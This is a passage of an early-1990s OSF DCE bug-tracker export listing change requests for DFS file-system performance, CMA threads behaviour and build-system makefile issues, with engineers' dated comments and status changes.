the system V deadlock detection can be done for DFS remote locking.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[7/29/92 public]
This is Kazar's area.  Up to him for more analysis and possible reassignment.

Filled in Subcomponent Name with `cm' 
Changed Responsible Engr. from `mason@transarc.com' to `kazar@transarc.com'

[9/3/92 public]
deadlock detection is beyond our abilities with the current architecture, as the
token manager at the server doesn't have enough information to know which
Unix client processes have which locks held.

This isn't a serious problem, as POSIX doesn't require that all deadlocks be
detected in client applications.  And it is hard to imagine how to fix it before DCE 2.0.
Changed Defect or Enhancement? from `def' to `enh' 
Changed Severity from `B' to `E' 
Changed Priority from `2' to `4'



CR Number                     : 3053
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Tabularization in Getacl/Setacl
Reported Date                 : 4/24/92
Found in Baseline             : 1.0.1
Found Date                    : 4/24/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[4/24/92 public]
efsx_getacl and efsx_setacl would be smaller (and cleaner) if a table, rather
than a switch statement, were used to convert the VNX_ACL_ codes to the
EPIF_AUX_IS_ bits.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/10/92 public]
Changed Subcomponent Name from `LFS' to `lfs'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 3046
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Do not fuss with ctime of deleted files
Reported Date                 : 4/24/92
Found in Baseline             : 1.0.1
Found Date                    : 4/24/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[4/24/92 public]
When unlinking a file or directory, Episode updates its ctime (because its
link count is changing).  To improve performance, this update can be omitted
if the link count is going to zero.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/10/92 public]
Changed Subcomponent Name from `LFS' to `lfs'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 3043
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Holding vntable_lock during vnode recycle
Reported Date                 : 4/24/92
Found in Baseline             : 1.0.1
Found Date                    : 4/24/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[4/24/92 public]
To improve performance by allowing more concurrency, the vnode recycling code
should not hold vntable_lock while calling vnm_Rouse.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/10/92 public]
Changed Subcomponent Name from `LFS' to `lfs'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2995
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : cma
Short Description             : Assert error in cma_errors.c
Reported Date                 : 4/22/92
Found in Baseline             : 1.0.1b11
Found Date                    : 4/22/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/22/92 public]
The following assert message appeared while running the DFS scout
program.  The program had been running for about 1.5 hours.

**** Assertion failure. About to enter kernel when already in kernel.
     at line 258 in ../../../src/threads/cma_errors.c

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[05/15/92 public]
Brian's still investigating this one.  The problem is that cma_error(),
which is itself an error output routine, asserts that it is not
called from within the CMA kernel.  Somehow, it was.  As a result,
cma_error() itself blew up, obscuring whatever failure had caused
cma_error() to be called in the first place.

An exhaustive check by Brian of the callers of cma_error() did
not reveal any case in which the routine could be called from
within the CMA kernel.

[05/22/92 public]
Our belief is that a) the underlying problem that caused cma__error()
to be called wrong (and hence to fail its assertion check) is a rare
occurrence, and (therefore) b) that this bug is not really a priority
1, since it's not impeding anyone's development.

We do, of course, want to understand the cma__error() failure, but
completing the checking required to find the erroneous call to
cma__error() will require more time than we have this week to put into
it.

[10/20/92 public]

OT cleanup 1 : Severity = unchanged(B)  ;  New priority = 1
                                           Old priority = 2

N.B. I raised the priority to 1 because this bug needs to be resolved.
     since this has the potential for violating the 1.0.2 exit criteria
     i.e. 1.0.2 cannot ship with any code defects open for more 180 days 
     old.

[10/20/92 public]
This defect is a dup of 5389.  I'm not marking it that way, though,
so as to avoid losing age information.  See the description of 5389
for more details.

[12/29/92 public]
Just reporting that this has been seen again. I was running a simple
DFS glue test on a rios configured as a sec, cds and FL server using
dce1.0.2b9. Unfortunately, since we do not have a thread-knowledgeable
debugger on the rios, path information can not be obtained.

[01/27/93 public]
From the above discussions we know that there are paths through
the threads code where cma_error gets called with the kernel lock
in hand. Attempts have been made to find these occurrences through
code examination and failed. The problem arises so infrequently that
we don't have enough data on hand to isolate it. As soon as 1.0.2
os shipped I'd like to add an identifying argument to the cma_error
function, it might be through a macro controlled by NDEBUG, so we
can at least identify the offending calls. The last time it happened
however was late December and the time before that was October.
We aren't likely to get a handle on this before ship and it doesn't
seem to happen often enough to have serious impact. I'm defering
this to after the 1.0.2 ship.

[9/8/93 public]

This bug exposes the larger issue that cma__error() can not indicate
the caller's _FILE_ and _LINE_ since it is a function call. This is an
enhancement which is begging to be done.

To do the enhancement, cma__error() will be changed to a macro which
prints out _LINE_ and _FILE_ of the caller. To keep the number of 
printf's from increasing, a substitute for cma__assert_fail will be 
written for cma__error() which has one less printf.

So far as this bug and its dup, CR5389, are concerned, it has not been
seen recently, but when it occurs, it can hardly go unnoticed, since
cma__error() causes an exception to be raised. We suspect that the bug
may no longer exist, since it has not been reported recently.

So, unless there are any objections, cma__error() will be changed to
be a macro. Instead of providing useless _LINE_ and _FILE_ information
about the line and file name of the cma__error() function, it will
give the line and file name of the caller. This will serve the purpose
of gathering more data about this and future/other bugs which cause
termination in the same manner. Since this bug has not been seen in a
while, it will be considered fixed when the enhancement is complete. If 
or when it is seen again, there will be better data about the calling 
code and it can be re-opened or re-submitted.

[10/13/93 public]
The bug that was causing cma__error to be called with kernel lock in hand 
hasn;t been seen in quite a while. What we want to do is fix up cma__error
with some code to tell us where it is called from so that if we do hit the
problem again we can get more information. cma__error is going to be 
reworked as part of the servicability requirements during 1.1 and that is
the time to do what we want to do with it. We;ll make this ot into an 
enhancement request for this work.



CR Number                     : 2975
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : bld
Subcomponent Name             : ode
Short Description             : .o's found via VPATH
Reported Date                 : 4/21/92
Found in Baseline             : 1.0.1b11
Found Date                    : 4/21/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/21/92 public]
If libfoo.a is to be built from foo.o, foo.c does not exist in the 
corresponding directory in the src tree, or in the VPATH'd src
directory, the obj directory corresponding to the VPATH is searched for
first foo.c AND THEN foo.o.

If the VPATH'd directory has already been visited, the former (finding
.c's in the obj dir) finds .c's such as idl stubs, even if you wanted to 
build them again in the new directory with different flags. This can
occur if the source you are trying to VPATH to is a .idl file. The latter 
finds .o's, also, perhaps built with the wrong flag. This can occur if
the foo.o (in the obj VPATH) was built from foo.c that was also VPATH'd to,
i.e. VPATH's are not chained.

[05/27/92 public]
Will be considered for DCE 1.0.2.

[5/27/93 public]
Yow, one year since the last update.

My fear is that the cure will be worse than the problem.  It's worth
assessing whether there are portions of DCE which *rely* on this
functionality.  If so, we need to open up component defects against them
and then fix this defect *after* the others have been closed.

[12/23/93 public]
Don't use VPATHs.

[12/23/93 public]
If not using VPATH, then how are two different directories supposed
to share a single source file?  A common case, e.g., is compiling
the same IDL with two different ACF's.  Raised to a B1.

[12/23/93 public]
Reorganize the source tree, of course.  ;-)

You're right, there are valid uses of VPATH.  I was thinking only of the
situations in which it is used for sloppy source organization.  Another
example of valid use is code which is compiled in both kernel and user
modes. 

Most of the situations in which VPATHs are used, however, could better be
solved by collecting the shared objects into libraries.

[7/1/94]
reassigned to rrizzo

[8/30/94 public]
We cannot address this problem in the timeframe left in the dce1.1
project.  If we are ever to address problems like this, the work
must be done at the beginning of a project.  That way if the RATs break
the build for a couple of days, its no big deal.

This is being deferred to dce1.2.



CR Number                     : 2954
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : cma_open() does not support FIFO files
Reported Date                 : 4/21/92
Found in Baseline             : 1.0.1
Found Date                    : 4/21/92
Severity                      : E
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/21/92 public]
The cma_open() call does not currently support POSIX named pipes (FIFO files).
This is obvious from looking at the code.  The cma__ts_open() macro simply
calls open directly with a lock held.  If the open() call blocks, and the
application expects to open the other end of the pipe in a separate thread,
then the program will hang indefinitely.  Ideally, cma_open() should not
block, but should allow other threads to continue execution.

[05/15/92 public]
This bug is still open, and will remain so throughout 1.0.1.
The priority says it all...

[10/20/92 public]

OT cleanup 1 : Severity = unchanged(E) ; New priority = 1
                                         Old priority = 3

N.B. Raised the priority to 1 because this bug has the potential
     for violating the 1.0.2 exit criteria i.e. 1.0.2 cannot ship
     with any bug older than 180 days old. Raising the priority DOES
     not mean that the defect has to be *fixed*. It DOES mean that a
     decision MUST be made quickly regarding what to do with the bug.
     Some of the possibilities are:

     a. cancel the bug
     b. is such a lower priority that it is not going to be fixed, 
        but it could be documented as a limitation. 
     c. the bug will be fixed.
     d. convert this to an enhancement.
     
     I will revisit this and update this CR as to what my recommendations
     are for dealing with this defect (I can't do it this instant because 
     I am in the middle of OT cleanup which is the highest priority item 
     I have to do).

[10/30/92 public]

I believe this defect should be reclassified as an enhancement.  I will do so in a few
days if I hear no dissent.

[11/05/92 public]
Made this an enhancement request, unassigned.



CR Number                     : 2920
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Special case common epia_Writes
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"special case common epia_Writes" - Special-case handling for writes that don't
promote, zero, or COW.  Perform all promotion/allocation/zeroing/COW before the
first iteration. (910822)

 [cost 15 benefit 15] (911211)
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fixed by" to 1.0.2



CR Number                     : 2918
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Remove tlock in file handle
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"remove tlock in file handle" - The tlock in the file handle dubious.
Can it be punted?  The lock itself is still needed for fid
discrimination. (see also "Describe Transaction and Tlock usage")
(910822)

See ~ota/doc/episode/tlock.rules. (920420)
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2917
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Speed up IsAnodeAllEmpty
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"speed up IsAnodeAllEmpty" - Perhaps convert it to a macro as well. (910822)
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2916
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Pre-create buffer in allocate frags
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"precreate buffer in allocate frags" - The epib_AllocateFrags routine could
create a buffer if requested to and new frags are first in previously empty
block.

 [cost 2 benefit 2] (911211)
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fixed by" to 1.0.2



CR Number                     : 2915
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Macro-ize epia_Start/EndTran
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"Macro-ize epia_Start/EndTran" - to be a call to epib_Start/EndTran.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2914
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Global directory hashing
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"global dir hashing" - (910830)

Bob tracked down a paper from Usenix, Winter 91 called "A New Hashing Package
for UNIX" by Seltzer and Yigit, which give much background on this family of
algorithms. (921218)

For detailed description seen ~/doc/episode/bob-dir-global-hash.tex.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[4/20/92 public]

Filled in Interest List CC with `bob@transarc.com'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2912
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Vertically integrate create
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"vertically integrate create" - Vertically integrate create code path.
The epiv_CreateAnode, epit_Allocate, and epia_Create are (almost) always
called on a single path that ends up doing a lot of extra work to allow
for use in non-existent general-purpose situations.  In particular, the
initial file status can be passed all the way down and the buffer
containing the anode can be obtained once and used through out.
epit_Allocate doesn't need to set the first word of the anode,
epia_Create will do that. (910821)

 [cost 6 benefit 4] (911211)
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2.



CR Number                     : 2911
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Macro-ize epiv_GetIdent
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"macro-ize epiv_GetIdent" - At least, allow getting the volume id only.

 [cost 1 benefit 1] (911211)  
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2910
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : read/modify/release fastpath
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"read/modify/release fastpath" - There are many cases where a buffer is
obtained, modified, and released in quick succession.  These may be able
to make use of a special routine all three operations in a single call
(e.g. quota update).  It is likely that there will be significant
economies from this combination. (910822)

Started. (911212)
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2908
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Shorten common ReadGeneral path
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/20/92 public]
"shorten common ReadGeneral path" - Arrange the code in ReadGeneral so that the
common path of finding a buffer in memory is as fast as possible.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[4/20/92 public]

Changed Defect or Enhancement? from `def' to `enh' 
Changed Short Description from `Shorten common readgeneral path' to `Shorten 
 common ReadGeneral path'

[7/20/92 public]
Changed "Fix by" to 1.0.2



CR Number                     : 2890
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 2902, 7735
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : rep
Short Description             : Changing valid/invalid status flag for replicas
Reported Date                 : 4/20/92
Found in Baseline             : 1.0.1
Found Date                    : 4/20/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[4/20/92 public]
The entry in the FLDB for a fileset records a status of valid or invalid for
each type of fileset (rw, ro, and bk).  Currently, the status flag for the
read-only version is changed from invalid to valid once a replication site
is defined for the fileset with the fts addsite command.  The status flag
should remain invalid until a replica actually exists at a replication site.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[4/20/92 public]
Filled in Inter-dependent CRs with `2902' 
Filled in Interest List CC with `jeff@transarc.com' 
Changed Fix By Baseline from `1.0.1' to `'

[7/15/92 public]
Ah, it's already an enhancement report.

[7/29/93 public]
Just make a note that this OT also covers the following task:
Deleting a RW fileset should NOT delete its read-only replicas. In addition,
also make sure that the corresponding entry in FLDB will refect the fact
that readOnly filesets are still valid. 
Changed Inter-dependent CRs from `2902' to `2902, 7735' 
Filled in Subcomponent Name with `rep' 
Changed Interest List CC from `jeff@transarc.com' to `jeff@transarc.com, 
 cfe@transarc.com' 
Changed Responsible Engr. from `cfe@transarc.com' to `khale@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'



CR Number                     : 2871
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : dfs
Subcomponent Name             : 
Short Description             : RIOS directories should be AIX directories
Reported Date                 : 4/18/92
Found in Baseline             : 1.0.1b11
Found Date                    : 4/18/92
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[4/18/92 public]
to be more consistent with the way that the OSF/1 source/building
environment most of the files which currently live under RIOS directories
should be moved to AIX directories. A clean separation should be made
between which pieces are machine dependent and which pieces are OS dependent.
I suspect that almost all of the current RIOS things are really OS dependent,
with very few hardware dependencies.  In the current OSF/1 setup, the
only machine dependent files are config/PMAX/param.h and PMAX/machdep.mk.
The reason to do this shuffling is to make the source tree more uniform;
now the various subdirectories must descend both to machine dependent and
operating system dependent subdirectories.  This is a step towards making
the OSF/1 and AIX environments more similar.

[4/21/92 public]
This should only be done in the dfs src if it is being done
for all the dce components.  
This should be done consistently for all the DCE src for the
rs/6000 reference platform or not at all. h

It does not seem like a high priority item for DCE 1.0.1.

[5/22/92 public]
add default fields
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[10/14/92 public]
I do not know how I became the owner of this.  I think OSF
should own it at least for now.  I also agree with Liz's
comment above that this should not be done unless it is
done across all of the DCE components.
Filled in Interest List CC with `demail1!carl' 
Changed Responsible Engr. from `burnett' to `treff' 
Changed Resp. Engr's Company from `ibm' to `osf'

[11/16/92 public]
This defect falls into the older-than-6-months before 1.0.2 ship category.
Can we turn it into a 1.1 task, or maybe just make it an enhancment.  IT 
seems unlikely that we will attack this before the 1.0.2 freeze.
Changed Interest List CC from `demail1!carl' to `demail1!carl, 
 jaffe@transarc.com'

[01/20/93 public]
Updated per OSF DFS bug conclave of 1/19/93.  I almost cancelled
this, but decided that it had enough merit to warrant keeping it.
However, if we accept that this change must be made across all
of DCE, and not just in DFS, then I have to admit I don't see it
happening any time soon, since I've never seen the topic discussed
outside DFS.  Still, if something like Howard Melman's visionary
plan for restructuring the source tree is ever implemented, this
could "easily" enough be tacked on.



CR Number                     : 2789
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : threads.mk defines CFLAGS for specific .o files
Reported Date                 : 4/15/92
Found in Baseline             : 1.0.1
Found Date                    : 4/15/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/15/92 public]
threads.mk defines <MACHINE>_libcma_OFILES.  This definition should be moved 
into machine dependent machdep.mk files in the libcma directory.
VAX_libcma_OFILES       ?= cma_vmprot.o
MIPS_libcma_OFILES      ?= cma_vmprot.o
MACH_libcma_OFILES      ?= cma_vmprot.o
PMAX_libcma_OFILES      ?= cma_vmprot.o
RIOS_libcma_OFILES      ?= getasyncinfo.o
HP300_libcma_OFILES     ?= cma_host.o
HP800_libcma_OFILES     ?= cma_host.o
APOLLO68K_libcma_OFILES ?= cma_host.o
threads.mk also defines <MACHINE>_INCLUDES which should be moved into 
machdep.mk files for the directory that it is used in.
MIPS_INCLUDES   ?= cma_host.h
RIOS_INCLUDES   ?= cma_host.h
PMAX_INCLUDES   ?= cma_host.h
HP800_INCLUDES  ?= cma_host.h
HP300_INCLUDES  ?= cma_host.h
APOLLO68K_INCLUDES ?= cma_host.h

[4/15/92 public]
Changed time to threads.  Problem is realy in threads.mk

[4/15/92 public]

Assigned to threads/Brian Keane/DEC, and changed mckeen@osf.org to mckeen
so he will get mail.

[04/24/92 public]
Since nothing is really "broken" by the current state of affairs, this
looks much more like an enhancement request than a defect report.  I
think it should be deferred till after 1.0.1.



CR Number                     : 2697
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : pthread_create should have EINVAL as a return value.
Reported Date                 : 4/13/92
Found in Baseline             : 1.0
Found Date                    : 4/13/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[4/13/92 public]
The return value EINVAL is not either in the code of the documentation
for the function call pthread_create. For many test cases, the return
value in pthread_create is EAGAIN, indicating that the system has a
problem, when, in fact, the user may have inserted an invalid value in
a parameter. The code, as well as the documentation, should allow a
return value of EINVAL to give the user more correct feedback.

[04/17/92 public]
The use of EINVAL, though not required by the standard for
pthread_create(), does seem like a useful extension, given the use
of this error return by other entry points.

However, I think providing it is an enhancement, not a bug fix, and
hence want to defer doing so till after 1.0.1.



CR Number                     : 2543
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : bld
Subcomponent Name             : 
Short Description             : Shared library stuff is target dependent
Reported Date                 : 4/4/92
Found in Baseline             : 1.0.1
Found Date                    : 4/4/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/4/92 public]

Various makefiles and .mk files do stuff related to shared libraries.  Even
just considering the two reference platforms, "shared libraries" work
differently.  What seems to be implied by "shared libraries" in the
makefiles is OSF's OSF/1 -style shared libraries.  (E.g., consider the use
of flags like "-pic-lib" in osf.dce.mk.)

It would seem like the whole topic of shared libraries needs to be
